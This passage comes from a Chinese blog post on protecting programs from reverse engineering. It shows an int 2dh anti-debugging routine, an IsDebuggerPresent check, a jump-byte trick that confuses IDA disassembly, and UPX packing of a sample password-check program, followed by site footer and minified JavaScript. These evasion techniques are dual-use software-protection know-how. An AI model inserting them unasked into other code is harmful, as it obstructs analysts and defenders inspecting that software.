ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="4-int-2dh"><a href="#4-int-2dh" class="headerlink" title="4.int 2dh"></a>4.int 2dh</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__declspec(naked) int __stdcall antidebugger2(void)</span><br><span class="line">&#123;</span><br><span class="line">    __asm&#123;</span><br><span class="line">        pushad</span><br><span class="line">        push ok</span><br><span class="line">        push dword ptr fs:[0]</span><br><span class="line">        mov dword ptr fs:[0], esp</span><br><span class="line">        mov buff, esp</span><br><span class="line">        xor eax, eax</span><br><span class="line">        int 2dh         ;执行int 2dh</span><br><span class="line">        jmp error</span><br><span class="line">ok:</span><br><span class="line">        mov esp, buff</span><br><span class="line">        pop dword ptr fs:[0]</span><br><span class="line">        add esp, 4</span><br><span class="line">        popad</span><br><span class="line">        xor eax, eax</span><br><span class="line">        ret</span><br><span class="line">error:</span><br><span class="line">        mov esp, buff</span><br><span class="line">        pop dword ptr fs:[0]</span><br><span class="line">        add esp, 4</span><br><span class="line">        popad</span><br><span class="line">        xor eax, eax</span><br><span class="line">        inc eax</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>返回 0 为正常，返回 1 表示挂载了调试器。</p>
<p>以后慢慢添加一些反调试技术。popf和int2d的原理，google：“anti- debug popf”和“anti-debug int2d”</p>
<h2 id="2-通过代码混淆防止分析"><a href="#2-通过代码混淆防止分析" class="headerlink" title="2.通过代码混淆防止分析"></a>2.通过代码混淆防止分析</h2><p>反调试技术使用方便，但如果用IDA这种静态分析，找到检测调试器的逻辑，最直接明了的就是查看调用这些API函数的地方，从而破解。</p>
<p>举个栗子:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">00401000 main proc near</span><br><span class="line">00401000   call  ds:__imp__IsDebuggerPresent@0 改写</span><br><span class="line">00401006   test  eax, eax</span><br><span class="line">00401008   jz    short loc_401021</span><br><span class="line">0040100A   push  offset aOnDebugger ; &quot;on debugger\n&quot;</span><br><span class="line">0040100F   call  ds:__imp__printf</span><br><span class="line">00401015   add   esp, 4</span><br><span class="line">00401018   call  ds:__imp__getchar</span><br><span class="line">0040101E   xor   eax, eax</span><br><span class="line">00401020   retn</span><br><span class="line">00401021 loc_401021:</span><br><span class="line">00401021   push  offset aNotOnDebugger ; &quot;not on debugger\n&quot;</span><br><span class="line">00401026   call  ds:__imp__printf</span><br><span class="line">0040102C   add   esp, 4</span><br><span class="line">0040102F   call  ds:__imp__getchar</span><br><span class="line">00401035   xor   eax, eax</span><br><span class="line">00401037   retn</span><br></pre></td></tr></table></figure>
<p>轻易找到API函数位置，容易分析，从而破解掉。</p>
<h3 id="1-代码混淆"><a href="#1-代码混淆" class="headerlink" title="1.代码混淆"></a>1.代码混淆</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00401000                   main proc near</span><br><span class="line">00401000 FF 15 00 20 40 00   call  ds:__imp__IsDebuggerPresent@0</span><br><span class="line">00401006 85 C0               test  eax, eax</span><br><span class="line">00401008 74 17               jz    short loc_401021</span><br></pre></td></tr></table></figure>
<p><strong>IsDebuggerPresent</strong>:调用的地方，机器码：<code>FF 15 00 20 40 00 85 C0 74 17</code></p>
<p>现在增加EB——&gt;<code>EB FF 15 00 20 40 00 85 C0 74 17</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00401000                main:</span><br><span class="line">00401000 EB FF            jmp   short near ptr main+1</span><br><span class="line">00401002 15 00 20 40 00   adc   eax, offset __imp__</span><br><span class="line">IsDebuggerPresent@0</span><br><span class="line">00401007 85 C0            test  eax, eax</span><br><span class="line">00401009 74 17            jz    short loc_401022</span><br></pre></td></tr></table></figure>
<p>在IDA中看到的就是上面的代码：call指令消失变成jmp adc test jz。然而机器语言的实际功能没有变化，因为<code>EB FF</code> 相当于向前跳转了一个字节，即<code>00401001</code></p>
<p><strong>关键</strong>：在于 <code>00401001</code>处的 FF，它可以当作前面 jmp 指令的一部分，也可以当作后面 call 指令的一部分。而 IDA 会从前往后按顺序进行反汇编，因此显示出的代码可能会和实际执行的代码不同。这就是所谓混淆。书里有个链接还不错，可以瞅瞅。</p>
<p><a href="http://www.cs.arizona.edu/solar/papers/CCS2003.pdf" target="_blank" rel="noopener">混淆可执行代码以提高对静态反汇编的抵抗力</a>:</p>
<h2 id="3-可执行文件压缩"><a href="#3-可执行文件压缩" class="headerlink" title="3.可执行文件压缩"></a>3.可执行文件压缩</h2><p>打包器（我们俗称壳）：packer，市场有很多，比如UPX，ASPack，VM等</p>
<p>UPX开源支持ELF，DLL，COFF等多种可执行文件格式。</p>
<p><a href="http://upx.sourceforge.net" target="_blank" rel="noopener">UPX</a>:<br><a href="http://www.aspack.com" target="_blank" rel="noopener">ASPack:</a></p>
<h3 id="1-压缩"><a href="#1-压缩" class="headerlink" title="1.压缩"></a>1.压缩</h3><p><strong>压缩壳</strong>：将原本可执行文件中的代码和数据进行压缩，然后将解压缩用的代码附加在前面，运行的时候先将原本的可执行数据解压缩出来，然后再运行解压缩后的数据。</p>
<p><strong>尝试分析：</strong></p>
<p>调用 IsDebuggerPresent 检测调试器是否存在。然后，如果向程序传递的参数为 xxxxxxxxx 这个字符串，则显示 correct!，否则显示 auth error。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc &lt; <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"$packed.exe &lt;password&gt;\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(IsDebuggerPresent())&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"on debugger\n"</span>);<span class="comment">// 在调试器上运行</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;<span class="comment">// 在调试器上不运行  </span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">"xxxxxxxxx"</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"correct!\n"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"auth error\n"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>IDA编译:得到packed.exe</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">00401000 main   proc near</span><br><span class="line">00401000 arg_0  = dword ptr  8</span><br><span class="line">00401000 arg_4  = dword ptr  0Ch</span><br><span class="line">00401000        push    ebp</span><br><span class="line">00401001        mov     ebp, esp</span><br><span class="line">00401003        cmp     [ebp+arg_0], 2</span><br><span class="line">00401007        jge     short loc_401028</span><br><span class="line">00401009        push    offset &quot;$packed.exe &lt;password&gt;\n&quot;</span><br><span class="line">0040100E        call    ds:__imp____iob_func</span><br><span class="line">00401014        add     eax, 40h</span><br><span class="line">00401017        push    eax    ; FILE *</span><br><span class="line">00401018        call    ds:__imp__fprintf</span><br><span class="line">0040101E        add     esp, 8</span><br><span class="line">00401021        mov     eax, 1</span><br><span class="line">00401026        pop     ebp</span><br><span class="line">00401027        retn</span><br><span class="line">00401028 loc_401028:</span><br><span class="line">00401028        call    ds:__imp__IsDebuggerPresent@0</span><br><span class="line">0040102E        test    eax, eax</span><br><span class="line">00401030        jz      short loc_401045</span><br><span class="line">00401032        push    offset aOnDebugger ; &quot;on debugger\n&quot;</span><br><span class="line">00401037        call    ds:__imp__printf</span><br><span class="line">0040103D        add     esp, 4</span><br><span class="line">00401040        or      eax, 0FFFFFFFFh</span><br><span class="line">00401043        pop     ebp</span><br><span class="line">00401044        retn</span><br><span class="line">00401045 loc_401045:</span><br><span class="line">00401045        mov     eax, [ebp+arg_4]</span><br><span class="line">00401048        mov     eax, [eax+4]</span><br><span class="line">0040104B        mov     ecx, offset aXxxxxxxx ; &quot;xxxxxxxx&quot;</span><br><span class="line">00401050 loc_401050:</span><br><span class="line">00401050        mov     dl, [eax]</span><br><span class="line">00401052        cmp     dl, [ecx]</span><br><span class="line">00401054        jnz     short loc_401070</span><br><span class="line">00401056        test    dl, dl</span><br><span class="line">00401058        jz      short loc_40106C</span><br><span class="line">0040105A        mov     dl, [eax+1]</span><br><span class="line">0040105D        cmp     dl, [ecx+1]</span><br><span class="line">00401060        jnz     short loc_401070</span><br><span class="line">00401062        add     eax, 2</span><br><span class="line">00401065        add     ecx, 2</span><br><span class="line">00401068        test    dl, dl</span><br><span class="line">0040106A        jnz     short loc_401050</span><br><span class="line">0040106C loc_40106C:</span><br><span class="line">0040106C        xor     eax, eax</span><br><span class="line">0040106E        jmp     short loc_401075</span><br><span class="line">00401070 loc_401070:</span><br><span class="line">00401070        sbb     eax, eax</span><br><span class="line">00401072        sbb     eax, 0FFFFFFFFh</span><br><span class="line">00401075 loc_401075:</span><br><span class="line">00401075        test    eax, eax</span><br><span class="line">00401077        jnz     short loc_401091</span><br><span class="line">00401079        push    offset aCorrect ; &quot;correct!\n&quot;</span><br><span class="line">0040107E        call    ds:__imp__printf</span><br><span class="line">00401084        add     esp, 4</span><br><span class="line">00401087        call    ds:__imp__getchar</span><br><span class="line">0040108D        xor     eax, eax</span><br><span class="line">0040108F        pop     ebp</span><br><span class="line">00401090        retn</span><br><span class="line">00401091 loc_401091:</span><br><span class="line">00401091        push    offset aAuthError ; &quot;auth error\n&quot;</span><br><span class="line">00401096        call    ds:__imp__printf</span><br><span class="line">0040109C        add     esp, 4</span><br><span class="line">0040109F        or      eax, 0FFFFFFFFh</span><br><span class="line">004010A2        pop     ebp</span><br><span class="line">004010A3        retn</span><br></pre></td></tr></table></figure>
<p>程序逻辑和流程，还是用于对比参数的字符串，以及输出的内容,相比源程序还是很好分析的。</p>
<h3 id="2-UPX加壳"><a href="#2-UPX加壳" class="headerlink" title="2.UPX加壳"></a>2.UPX加壳</h3><p><code>upx.exe packed.exe</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">        File size         Ratio      Format      Name</span><br><span class="line">   --------------------   ------   -----------   -----------</span><br><span class="line">      7168 -&gt;      5120   71.43%    win32/pe     packed.exe</span><br><span class="line">Packed 1 file.</span><br></pre></td></tr></table></figure>
<p>IDA打开后流程变得复杂，二进制编辑器打开可执行文件，也找不到correct，auth，error等字符串。</p>
<p><img src="/2018/06/06/如何防止软件被别人逆向/IDA-1.png" alt="IDA-1"></p>
<h3 id="3-UPX脱壳"><a href="#3-UPX脱壳" class="headerlink" title="3.UPX脱壳"></a>3.UPX脱壳</h3><p>upx壳直接-d就可以解包，也可以手工脱。</p>
<p><code>upx.exe -d packed.exe</code></p>
<p>手工脱壳就不说了，教程蛮多。</p>
<p>溜了溜了，先从最基础的来，以后再慢慢添加，弄点深层次的~</p>
<p>两个正经写博客的程序猿：)  </p>

      

      
    </div>
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">reverse</a>
        		</li>
      		
		</ul>
	</div>

      

      
        <p class="article-more-link">
          <a class="article-more-a" href="/2018/06/06/如何防止软件被别人逆向/">展开全文 >></a>
        </p>
      

      
      <div class="clearfix"></div>
    </div>
  </div>
</article>

<aside class="wrap-side-operation">
    <div class="mod-side-operation">
        
        <div class="jump-container" id="js-jump-container" style="display:none;">
            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
                <i class="icon-font icon-back"></i>
            </a>
            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
                <i class="icon-font icon-plane jump-plane"></i>
            </div>
        </div>
        
        
    </div>
</aside>




  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/page/4/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/6/">Next &raquo;</a>
    </nav>
  


          </div>
        </div>
      </div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
    	<div class="footer-left">
    		&copy; 2018 ShowMeShell
    	</div>
    	<!--统计start-->
      <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
      </script>
      <span id="busuanzi_container_site_pv">
    本站总访问量<span id="busuanzi_value_site_pv"></span>次
  </span>
      <span id="busuanzi_container_site_uv">
  总访客数<span id="busuanzi_value_site_uv"></span>人次
  </span>
  	 <span id="busuanzi_container_page_pv">
  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
</span>
      <!--统计end-->
      	<div class="footer-right">
      		<a >Welcome to my blog~ </a> 
      	</div>
    </div>
  </div>
</footer>

    </div>
    <script>
	var yiliaConfig = {
		mathjax: false,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false,
		toc_hide_index: true,
		root: "/",
		innerArchive: true,
		showTags: false
	}
</script>

<script>!function(t){function n(e){if(r[e])return r[e].exports;var i=r[e]={exports:{},id:e,loaded:!1};return t[e].call(i.exports,i,i.exports,n),i.loaded=!0,i.exports}var r={};n.m=t,n.c=r,n.p="./",n(0)}([function(t,n,r){r(195),t.exports=r(191)},function(t,n,r){var e=r(3),i=r(52),o=r(27),u=r(28),c=r(53),f="prototype",a=function(t,n,r){var s,l,h,v,p=t&a.F,d=t&a.G,y=t&a.S,g=t&a.P,b=t&a.B,m=d?e:y?e[n]||(e[n]={}):(e[n]||{})[f],x=d?i:i[n]||(i[n]={}),w=x[f]||(x[f]={});d&&(r=n);for(s in r)l=!p&&m&&void 0!==m[s],h=(l?m:r)[s],v=b&&l?c(h,e):g&&"function"==typeof h?c(Function.call,h):h,m&&u(m,s,h,t&a.U),x[s]!=h&&o(x,s,v),g&&w[s]!=h&&(w[s]=h)};e.core=i,a.F=1,a.G=2,a.S=4,a.P=8,a.B=16,a.W=32,a.U=64,a.R=128,t.exports=a},function(t,n,r){var e=r(6);t.exports=function(t){if(!e(t))throw TypeError(t+" is not an object!");return t}},function(t,n){var r=t.exports="undefined"!=typeof window&&window.Math==Math?window:"undefined"!=typeof self&&self.Math==Math?self:Function("return this")();"number"==typeof __g&&(__g=r)},function(t,n){t.exports=function(t){try{return!!t()}catch(t){return!0}}},function(t,n){var r=t.exports="undefined"!=typeof window&&window.Math==Math?window:"undefined"!=typeof self&&self.Math==Math?self:Function("return this")();"number"==typeof __g&&(__g=r)},function(t,n){t.exports=function(t){return"object"==typeof t?null!==t:"function"==typeof t}},function(t,n,r){var e=r(126)("wks"),i=r(76),o=r(3).Symbol,u="function"==typeof o;(t.exports=function(t){return e[t]||(e[t]=u&&o[t]||(u?o:i)("Symbol."+t))}).store=e},function(t,n){var r={}.hasOwnProperty;t.exports=function(t,n){return r.call(t,n)}},function(t,n,r){var e=r(94),i=r(33);t.exports=function(t){return e(i(t))}},function(t,n,r){t.exports=!r(4)(function(){return 7!=Object.defineProperty({},"a",{get:function(){return 7}}).a})},function(t,n,r){var e=r(2),i=r(167),o=r(50),u=Object.defineProperty;n.f=r(10)?Object.defineProperty:function(t,n,r){if(e(t),n=o(n,!0),e(r),i)try{return u(t,n,r)}catch(t){}if("get"in r||"set"in r)throw TypeError("Accessors not supported!");return"value"in r&&(t[n]=r.value),t}},function(t,n,r){t.exports=!r(18)(function(){return 7!=Object.defineProperty({},"a",{get:function(){return 7}}).a})},function(t,n,r){var e=r(14),i=r(22);t.exports=r(12)?function(t,n,r){return e.f(t,n,i(1,r))}:function(t,n,r){return t[n]=r,t}},function(t,n,r){var e=r(20),i=r(58),o=r(42),u=Object.defineProperty;n.f=r(12)?Object.defineProperty:function(t,n,r){if(e(t),n=o(n,!0),e(r),i)try{return u(t,n,r)}catch(t){}if("get"in r||"set"in r)throw TypeError("Accessors not supported!");return"value"in r&&(t[n]=r.value),t}},function(t,n,r){var e=r(40)("wks"),i=r(23),o=r(5).Symbol,u="function"==typeof o;(t.exports=function(t){return e[t]||(e[t]=u&&o[t]||(u?o:i)("Symbol."+t))}).store=e},function(t,n,r){var e=r(67),i=Math.min;t.exports=function(t){return t>0?i(e(t),9007199254740991):0}},function(t,n,r){var e=r(46);t.exports=function(t){return Object(e(t))}},function(t,n){t.exports=function(t){try{return!!t()}catch(t){return!0}}},function(t,n,r){var e=r(63),i=r(34);t.exports=Object.keys||function(t){return e(t,i)}},function(t,n,r){var e=r(21);t.exports=function(t){if(!e(t))throw TypeError(t+" is not an object!");return t}},function(t,n){t.exports=function(t){return"object"==typeof t?null!==t:"function"==typeof t}},function(t,n){t.exports=function(t,n){return{enumerable:!(1&t),configurable:!(2&t),writable:!(4&t),value:n}}},function(t,n){var r=0,e=Math.random();t.exports=function(t){return"Symbol(".concat(void 0===t?"":t,")_",(++r+e).toString(36))}},function(t,n){var r={}.hasOwnProperty;t.exports=function(t,n){return r.call(t,n)}},function(t,n){var r=t.exports={version:"2.4.0"};"number"==typeof __e&&(__e=r)},function(t,n){t.exports=function(t){if("function"!=typeof t)throw TypeError(t+" is not a function!");return t}},function(t,n,r){var e=r(11),i=r(66);t.exports=r(10)?function(t,n,r){return e.f(t,n,i(1,r))}:function(t,n,r){return t[n]=r,t}},function(t,n,r){var e=r(3),i=r(27),o=r(24),u=r(76)("src"),c="toString",f=Function[c],a=(""+f).split(c);r(52).inspectSource=function(t){return f.call(t)},(t.exports=function(t,n,r,c){var f="function"==typeof r;f&&(o(r,"name")||i(r,"name",n)),t[n]!==r&&(f&&(o(r,u)||i(r,u,t[n]?""+t[n]:a.join(String(n)))),t===e?t[n]=r:c?t[n]?t[n]=r:i(t,n,r):(delete t[n],i(t,n,r)))})(Function.prototype,c,function(){return"function"==typeof this&&this[u]||f.call(this)})},function(t,n,r){var e=r(1),i=r(4),o=r(46),u=function(t,n,r,e){var i=String(o(t)),u="<"+n;return""!==r&&(u+=" "+r+'="'+String(e).replace(/"/g,"&quot;")+'"'),u+">"+i+"</"+n+">"};t.exports=function(t,n){var r={};r[t]=n(u),e(e.P+e.F*i(function(){var n=""[t]('"');return n!==n.toLowerCase()||n.split('"').length>3}),"String",r)}},function(t,n,r){var e=r(115),i=r(46);t.exports=function(t){return e(i(t))}},function(t,n,r){var e=r(116),i=r(66),o=r(30),u=r(50),c=r(24),f=r(167),a=Object.getOwnPropertyDescriptor;n.f=r(10)?a:function(t,n){if(t=o(t),n=u(n,!0),f)try{return a(t,n)}catch(t){}if(c(t,n))return i(!e.f.call(t,n),t[n])}},function(t,n,r){var e=r(24),i=r(17),o=r(145)("IE_PROTO"),u=Object.prototype;t.exports=Object.getPrototypeOf||function(t){return t=i(t),e(t,o)?t[o]:"function"==typeof t.constructor&&t instanceof t.constructor?t.constructor.prototype:t instanceof Object?u:null}},function(t,n){t.exports=function(t){if(void 0==t)throw TypeError("Can't call method on  "+t);return t}},function(t,n){t.exports="constructor,hasOwnProperty,isPrototypeOf,propertyIsEnumerable,toLocaleString,toString,valueOf".split(",")},function(t,n){t.exports={}},function(t,n){t.exports=!0},function(t,n){n.f={}.propertyIsEnumerable},function(t,n,r){var e=r(14).f,i=r(8),o=r(15)("toStringTag");t.exports=function(t,n,r){t&&!i(t=r?t:t.prototype,o)&&e(t,o,{configurable:!0,value:n})}},function(t,n,r){var e=r(40)("keys"),i=r(23);t.exports=function(t){return e[t]||(e[t]=i(t))}},function(t,n,r){var e=r(5),i="__core-js_shared__",o=e[i]||(e[i]={});t.exports=function(t){return o[t]||(o[t]={})}},function(t,n){var r=Math.ceil,e=Math.floor;t.exports=function(t){return isNaN(t=+t)?0:(t>0?e:r)(t)}},function(t,n,r){var e=r(21);t.exports=function(t,n){if(!e(t))return t;var r,i;if(n&&"function"==typeof(r=t.toString)&&!e(i=r.call(t)))return i;if("function"==typeof(r=t.valueOf)&&!e(i=r.call(t)))return i;if(!n&&"function"==typeof(r=t.toString)&&!e(i=r.call(t)))return i;throw TypeError("Can't convert object to primitive value")}},function(t,n,r){var e=r(5),i=r(25),o=r(36),u=r(44),c=r(14).f;t.exports=function(t){var n=i.Symbol||(i.Symbol=o?{}:e.Symbol||{});"_"==t.charAt(0)||t in n||c(n,t,{value:u.f(t)})}},function(t,n,r){n.f=r(15)},function(t,n){var r={}.toString;t.exports=function(t){return r.call(t).slice(8,-1)}},function(t,n){t.exports=function(t){if(void 0==t)throw TypeError("Can't call method on  "+t);return t}},function(t,n,r){var e=r(4);t.exports=function(t,n){return!!t&&e(function(){n?t.call(null,function(){},1):t.call(null)})}},function(t,n,r){var e=r(53),i=r(115),o=r(17),u=r(16),c=r(203);t.exports=function(t,n){var r=1==t,f=2==t,a=3==t,s=4==t,l=6==t,h=5==t||l,v=n||c;return function(n,c,p){for(var d,y,g=o(n),b=i(g),m=e(c,p,3),x=u(b.length),w=0,S=r?v(n,x):f?v(n,0):void 0;x>w;w++)if((h||w in b)&&(d=b[w],y=m(d,w,g),t))if(r)S[w]=y;else if(y)switch(t){case 3:return!0;case 5:return d;case 6:return w;case 2:S.push(d)}else if(s)return!1;return l?-1:a||s?s:S}}},function(t,n,r){var e=r(1),i=r(52),o=r(4);t.exports=function(t,n){var r=(i.Object||{})[t]||Object[t],u={};u[t]=n(r),e(e.S+e.F*o(function(){r(1)}),"Object",u)}},function(t,n,r){var e=r(6);t.exports=function(t,n){if(!e(t))return t;var r,i;if(n&&"function"==typeof(r=t.toString)&&!e(i=r.call(t)))return i;if("function"==typeof(r=t.valueOf)&&!e(i=r.call(t)))return i;if(!n&&"function"==typeof(r=t.toString)&&!e(i=r.call(t)))return i;throw TypeError("Can't convert object to primitive value")}},function(t,n,r){var e=r(5),i=r(25),o=r(91),u=r(13),c="prototype",f=function(t,n,r){var a,s,l,h=t&f.F,v=t&f.G,p=t&f.S,d=t&f.P,y=t&f.B,g=t&f.W,b=v?i:i[n]||(i[n]={}),m=b[c],x=v?e:p?e[n]:(e[n]||{})[c];v&&(r=n);for(a in r)(s=!h&&x&&void 0!==x[a])&&a in b||(l=s?x[a]:r[a],b[a]=v&&"function"!=typeof x[a]?r[a]:y&&s?o(l,e):g&&x[a]==l?function(t){var n=function(n,r,e){if(this instanceof t){switch(arguments.length){case 0:return new t;case 1:return new t(n);case 2:return new t(n,r)}return new t(n,r,e)}return t.apply(this,arguments)};return n[c]=t[c],n}(l):d&&"function"==typeof l?o(Function.call,l):l,d&&((b.virtual||(b.virtual={}))[a]=l,t&f.R&&m&&!m[a]&&u(m,a,l)))};f.F=1,f.G=2,f.S=4,f.P=8,f.B=16,f.W=32,f.U=64,f.R=128,t.exports=f},function(t,n){var r=t.exports={version:"2.4.0"};"number"==typeof __e&&(__e=r)},function(t,n,r){var e=r(26);t.exports=function(t,n,r){if(e(t),void 0===n)return t;switch(r){case 1:return function(r){return t.call(n,r)};case 2:return function(r,e){return t.call(n,r,e)};case 3:return function(r,e,i){return t.call(n,r,e,i)}}return function(){return t.apply(n,arguments)}}},function(t,n,r){var e=r(183),i=r(1),o=r(126)("metadata"),u=o.store||(o.store=new(r(186))),c=function(t,n,r){var i=u.get(t);if(!i){if(!r)return;u.set(t,i=new e)}var o=i.get(n);if(!o){if(!r)return;i.set(n,o=new e)}return o},f=function(t,n,r){var e=c(n,r,!1);return void 0!==e&&e.has(t)},a=function(t,n,r){var e=c(n,r,!1);return void 0===e?void 0:e.get(t)},s=function(t,n,r,e){c(r,e,!0).set(t,n)},l=function(t,n){var r=c(t,n,!1),e=[];return r&&r.forEach(function(t,n){e.push(n)}),e},h=function(t){return void 0===t||"symbol"==typeof t?t:String(t)},v=function(t){i(i.S,"Reflect",t)};t.exports={store:u,map:c,has:f,get:a,set:s,keys:l,key:h,exp:v}},function(t,n,r){"use strict";if(r(10)){var e=r(69),i=r(3),o=r(4),u=r(1),c=r(127),f=r(152),a=r(53),s=r(68),l=r(66),h=r(27),v=r(73),p=r(67),d=r(16),y=r(75),g=r(50),b=r(24),m=r(180),x=r(114),w=r(6),S=r(17),_=r(137),O=r(70),E=r(32),P=r(71).f,j=r(154),F=r(76),M=r(7),A=r(48),N=r(117),T=r(146),I=r(155),k=r(80),L=r(123),R=r(74),C=r(130),D=r(160),U=r(11),W=r(31),G=U.f,B=W.f,V=i.RangeError,z=i.TypeError,q=i.Uint8Array,K="ArrayBuffer",J="Shared"+K,Y="BYTES_PER_ELEMENT",H="prototype",$=Array[H],X=f.ArrayBuffer,Q=f.DataView,Z=A(0),tt=A(2),nt=A(3),rt=A(4),et=A(5),it=A(6),ot=N(!0),ut=N(!1),ct=I.values,ft=I.keys,at=I.entries,st=$.lastIndexOf,lt=$.reduce,ht=$.reduceRight,vt=$.join,pt=$.sort,dt=$.slice,yt=$.toString,gt=$.toLocaleString,bt=M("iterator"),mt=M("toStringTag"),xt=F("typed_constructor"),wt=F("def_constructor"),St=c.CONSTR,_t=c.TYPED,Ot=c.VIEW,Et="Wrong length!",Pt=A(1,function(t,n){return Tt(T(t,t[wt]),n)}),jt=o(function(){return 1===new q(new Uint16Array([1]).buffer)[0]}),Ft=!!q&&!!q[H].set&&o(function(){new q(1).set({})}),Mt=function(t,n){if(void 0===t)throw z(Et);var r=+t,e=d(t);if(n&&!m(r,e))throw V(Et);return e},At=function(t,n){var r=p(t);if(r<0||r%n)throw V("Wrong offset!");return r},Nt=function(t){if(w(t)&&_t in t)return t;throw z(t+" is not a typed 